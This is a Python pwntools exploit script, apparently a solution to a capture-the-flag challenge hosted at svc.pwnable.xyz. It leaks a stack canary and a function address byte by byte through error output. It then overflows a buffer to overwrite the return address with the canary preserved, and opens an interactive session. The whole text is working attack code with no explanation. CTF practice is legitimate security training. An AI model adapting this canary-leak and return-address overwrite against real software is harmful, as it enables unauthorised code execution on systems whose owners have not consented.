from pwn import *

def find_canary():
    count = 11
    final = ""
    while (count < 0x12):
        payload = str(chr(count + 0x30))
        sh.sendlineafter('> ', payload)
        sh.recvuntil("Error: ")
        temp = sh.recvline()[0:3]
        if (int(temp) < 100 and int(temp) >= 10):
            var = temp[:-1]
        elif (int(temp) < 10):
            var = temp[:-2]
        else:
            var = temp
        fin = int(var)
        final += struct.pack("B", fin)
        count += 1
    return final


def find_win_addr():
    count = 0x1a
    final = ""
    while (count < 0x20):
        payload = str(chr(count + 0x30))
        sh.sendlineafter('> ', payload)
        sh.recvuntil("Error: ")
        temp = sh.recvline()[0:3]
        if (int(temp) < 100 and int(temp) >= 10):
            var = temp[:-1]
        elif (int(temp) < 10):
            var = temp[:-2]
        else:
            var = temp

        fin = int(var)
        if (count == 0x1a):
            fin += 0x7c
        if (count == 0x1b):
            fin -= 0x1
        final += struct.pack("B", fin)
        count += 1
    return final


debug = 0
if not debug:
    sh = remote('svc.pwnable.xyz', 30017)
else:
    sh = process('./challenge')

name = "A"*4
sh.sendlineafter(': ', name)

canary  = find_canary()
win_addr = find_win_addr()

sh.sendlineafter('> ', '1')
message = "A"*41
message += canary
message += "A"*8
message += win_addr

sh.sendlineafter(': ', message)
sh.sendlineafter('> ', '1')
message = "A"*40
sh.sendlineafter(': ', message)
sh.sendlineafter('> ', '0')
sh.interactive()



